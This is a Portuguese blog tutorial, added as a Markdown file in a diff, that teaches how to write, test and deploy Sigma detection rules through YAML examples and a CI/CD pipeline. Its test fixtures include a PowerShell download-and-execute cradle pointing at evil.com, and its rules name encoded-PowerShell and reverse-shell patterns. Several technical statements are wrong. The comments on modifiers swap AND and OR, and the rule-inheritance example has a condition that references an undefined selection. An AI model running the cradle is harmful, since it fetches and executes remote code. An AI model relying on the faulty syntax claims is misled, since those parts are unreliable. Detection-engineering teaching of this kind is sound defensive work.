@@ -1,0 +1,371 @@
+---
+title: 'Sigma Rules 101: Do zero ao detection engineer'
+description: 'Guia completo para escrever, testar e implantar Sigma rules. Cobre sintaxe, boas práticas, integração CI/CD e exemplos do mundo real.'
+date: '2024-02-10'
+tags: ['Detection Engineering', 'Sigma', 'SIEM', 'MITRE ATT&CK', 'Blue Team', 'Tutorial']
+readingTime: 18
+series: 'Detection Engineering Fundamentals'
+---
+
+# Sigma Rules 101: Do zero ao detection engineer
+
+Sigma é o **padrão aberto para regras de detecção** — pense no "Snort dos logs". Independente de vendor, legível por humanos e com uma comunidade enorme por trás. Se você está em Blue Team, precisa conhecer Sigma.
+
+## Por que Sigma?
+
+| Problema | Solução com Sigma |
+|---------|----------------|
+| Vendor lock-in | Escreva uma vez, implante no Splunk, Elastic, Sentinel, CrowdStrike etc. |
+| Consultas impossíveis de manter | Estrutura YAML com herança, modifiers e macros |
+| Sem controle de versão | Regras são código — Git, PRs, CI/CD |
+| Sem testes | `sigma test` com amostras de logs sintéticos |
+
+## Estrutura de uma regra
+
+```yaml
+title: Suspicious PowerShell EncodedCommand
+id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
+status: test
+description: Detects PowerShell execution with base64 encoded commands
+author: Blue-Sentinel
+date: 2024/01/15
+modified: 2024/01/15
+tags:
+  - attack.execution
+  - attack.t1059.001
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    EventID: 4688
+    NewProcessName|endswith: '\powershell.exe'
+    CommandLine|contains:
+      - ' -enc '
+      - ' -encodedcommand '
+      - ' -e '
+  condition: selection
+falsepositives:
+  - Legitimate administrative scripts using encoded commands
+  - Some backup/management tools
+level: medium
+```
+
+### Principais seções explicadas
+
+| Seção | Função | Obrigatória? |
+|---------|---------|-----------|
+| `title` | Nome legível por humanos | ✅ Sim |
+| `id` | UUID v4 (globalmente único) | ✅ Sim |
+| `status` | `test` \| `experimental` \| `stable` \| `deprecated` | ✅ Sim |
+| `logsource` | De onde vem o log (category + product) | ✅ Sim |
+| `detection` | A lógica em si (selection + condition) | ✅ Sim |
+| `tags` | Mapeamento para MITRE ATT&CK | ✅ Recomendada |
+| `falsepositives` | Cenários conhecidos de FP | ✅ Recomendada |
+| `level` | `critical` \| `high` \| `medium` \| `low` \| `informational` | ✅ Recomendada |
+
+## Aprofundando na lógica de detecção
+
+### Modifiers de campo
+
+```yaml
+detection:
+  selection:
+    # Exact match (default)
+    Image: "C:\Windows\System32\powershell.exe"
+    
+    # Case-insensitive
+    Image|endswith: "\powershell.exe"
+    
+    # Contains substring
+    CommandLine|contains: " -enc "
+    
+    # Regex (PCRE)
+    CommandLine|re: "(-enc|-encodedcommand|-e)\s+[A-Za-z0-9+/=]+"
+    
+    # CIDR matching
+    DestinationIp|cidr: "10.0.0.0/8"
+    
+    # All values must match (AND)
+    ParentImage|endswith: 
+      - "\cmd.exe"
+      - "\powershell.exe"
+    
+    # Any value matches (OR)
+    CommandLine|contains|all:
+      - "invoke-expression"
+      - "downloadstring"
+```
+
+### Lógica da condição
+
+```yaml
+condition: selection and not filter_false_positives
+
+# Complex conditions
+condition: (selection1 or selection2) and not (filter1 or filter2)
+condition: selection and 2 of (filter_*)  # At least 2 filter_* must match
+condition: selection and not (exclusion1 or exclusion2)
+```
+
+### Herança de regras
+
+```yaml
+# Base rule
+title: Base PowerShell Detection
+id: base-powershell
+detection:
+  selection_powershell:
+    Image|endswith: '\powershell.exe'
+  condition: selection_powershell
+
+# Derived rule
+title: PowerShell EncodedCommand
+id: powershell-encodedcommand
+related:
+  - base-powershell
+detection:
+  selection_encoded:
+    CommandLine|contains: ' -enc '
+  condition: selection_powershell and selection_encoded
+```
+
+## Testando suas regras
+
+### 1. Validação com a Sigma CLI
+
+```bash
+# Install
+pip install sigma-cli
+
+# Validate syntax
+sigma validate rules/
+
+# Convert to target SIEM
+sigma convert -t splunk rules/powershell_encodedcommand.yml
+sigma convert -t elastic rules/powershell_encodedcommand.yml
+sigma convert -t kibana rules/powershell_encodedcommand.yml
+```
+
+### 2. Testes unitários com logs sintéticos
+
+```yaml
+# tests/test_powershell_encodedcommand.yml
+rule_id: powershell-encodedcommand
+test_cases:
+  - name: "Positive - Base64 encoded command"
+    log:
+      EventID: 4688
+      NewProcessName: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+      CommandLine: "powershell.exe -enc SQBuAHYAbwBrAGUA..."
+    expected: true
+  
+  - name: "Positive - Short form -e"
+    log:
+      EventID: 4688
+      NewProcessName: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+      CommandLine: "powershell -e SQBuAHYAbwBrAGUA..."
+    expected: true
+  
+  - name: "Negative - Normal script execution"
+    log:
+      EventID: 4688
+      NewProcessName: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+      CommandLine: "powershell.exe -File C:\Scripts\backup.ps1"
+    expected: false
+  
+  - name: "Edge case - Partial encoding in command"
+    log:
+      EventID: 4688
+      NewProcessName: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
+      CommandLine: "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com')\""
+    expected: true  # Still suspicious, different rule
+```
+
+Execute os testes:
+```bash
+python -m pytest tests/ -v --sigma-rules=rules/
+```
+
+## Pipeline de CI/CD
+
+```yaml
+# .github/workflows/sigma.yml
+name: Sigma Rules Pipeline
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Set up Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      
+      - name: Install Sigma CLI
+        run: pip install sigma-cli pyyaml
+      
+      - name: Lint Rules
+        run: sigma validate rules/
+      
+      - name: Run Unit Tests
+        run: python -m pytest tests/ -v --sigma-rules=rules/
+      
+      - name: Check MITRE Coverage
+        run: python tools/coverage.py --fail-under=80
+      
+      - name: Deploy to Elastic (main only)
+        if: github.ref == 'refs/heads/main'
+        run: |
+          sigma convert -t elastic rules/ > rules.ndjson
+          curl -X POST "${{ secrets.ELASTIC_ENDPOINT }}/_bulk" \
+            -H "Authorization: ApiKey ${{ secrets.ELASTIC_API_KEY }}" \
+            --data-binary @rules.ndjson
+```
+
+## Boas práticas
+
+### 1. **Seja específico, não genérico**
+
+❌ Ruim:
+```yaml
+selection:
+  CommandLine|contains: "powershell"
+```
+
+✅ Bom:
+```yaml
+selection:
+  NewProcessName|endswith: '\powershell.exe'
+  CommandLine|contains|all:
+    - ' -enc '
+    - ' -w hidden '
+```
+
+### 2. **Sempre inclua false positives**
+
+```yaml
+falsepositives:
+  - Legitimate admin scripts using encoded commands for obfuscation
+  - Some EDR/AV products use encoded commands internally
+  - Automated deployment tools (SCCM, Ansible)
+level: medium
+```
+
+### 3. **Mapeie para o MITRE ATT&CK**
+
+```yaml
+tags:
+  - attack.execution
+  - attack.t1059.001  # Command and Scripting Interpreter: PowerShell
+```
+
+### 4. **Use IDs com significado**
+
+```yaml
+id: powershell-encoded-command  # Human-readable
+# OR
+id: a1b2c3d4-e5f6-7890-abcd-ef1234567890  # UUID v4
+```
+
+### 5. **Versione suas regras**
+
+```yaml
+date: 2024/01/15
+modified: 2024/03/20
+version: 2
+```
+
+## Padrões comuns
+
+### Criação de processo (Windows 4688)
+
+```yaml
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    EventID: 4688
+    # Parent-child anomalies
+    ParentImage|endswith:
+      - '\winword.exe'
+      - '\excel.exe'
+      - '\outlook.exe'
+    Image|endswith:
+      - '\cmd.exe'
+      - '\powershell.exe'
+      - '\wscript.exe'
+      - '\cscript.exe'
+  condition: selection
+```
+
+### Conexão de rede (Sysmon 3)
+
+```yaml
+logsource:
+  category: network_connection
+  product: windows
+detection:
+  selection:
+    EventID: 3
+    DestinationPort:
+      - 4444
+      - 8080
+      - 6667
+    # Or use CIDR for internal ranges
+    DestinationIp|cidr:
+      - '10.0.0.0/8'
+      - '172.16.0.0/12'
+      - '192.168.0.0/16'
+  condition: selection
+```
+
+### Criação de arquivo (Sysmon 11)
+
+```yaml
+logsource:
+  category: file_event
+  product: windows
+detection:
+  selection:
+    EventID: 11
+    TargetFilename|endswith:
+      - '.exe'
+      - '.dll'
+      - '.ps1'
+      - '.bat'
+    Image|endswith:
+      - '\powershell.exe'
+      - '\wscript.exe'
+      - '\cmd.exe'
+  condition: selection
+```
+
+## Recursos
+
+- **Repositório oficial**: https://github.com/SigmaHQ/sigma
+- **Coleção de regras**: https://github.com/SigmaHQ/sigma/tree/master/rules
+- **Sigma CLI**: https://github.com/SigmaHQ/sigma/tree/master/tools
+- **MITRE ATT&CK**: https://attack.mitre.org/
+- **Uncoder.io**: conversor online de Sigma (https://uncoder.io)
+
+## Próximos passos
+
+1. **Clone** o repositório Sigma e explore `rules/`
+2. **Escreva** sua primeira regra para uma técnica que você conhece bem
+3. **Teste** com `sigma test` e logs sintéticos
+4. **Implante** no seu SIEM com `sigma convert`
+5. **Automatize** com a pipeline de CI/CD acima
+
+---
+
+*Detection engineering é um ofício. Sigma te dá as ferramentas — a prática faz o mestre.*
